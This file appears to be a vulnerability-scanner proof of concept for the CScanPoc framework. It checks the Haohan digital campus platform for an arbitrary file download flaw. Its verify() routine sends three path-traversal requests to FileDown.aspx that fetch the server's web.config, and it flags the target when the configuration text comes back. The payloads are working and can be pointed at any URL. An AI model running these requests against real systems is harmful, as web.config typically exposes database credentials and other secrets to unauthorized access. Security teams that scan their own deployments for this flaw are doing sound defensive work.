# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Haohan_0002' # 平台漏洞编号，留空
    name = '皓翰数字化校园平台通用型3处任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-06-24'  # 漏洞公布时间
    desc = '''
        皓翰数字化校园平台通用型3处任意文件下载。
        '/IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config',
        '/Inedu3In1/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config',
        '/IneduBlog/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config'
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0103034
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '皓翰数字化校园平台'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '266e2bde-041f-4f50-a441-1be8728efb0c'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads=[
                '/IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config',
                '/Inedu3In1/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config',
                '/IneduBlog/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config']
            for payload in payloads:
                target = arg + payload
                code, head, res, errcode, _ = hh.http(target)
                
                if  code==200 and '</configuration>' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()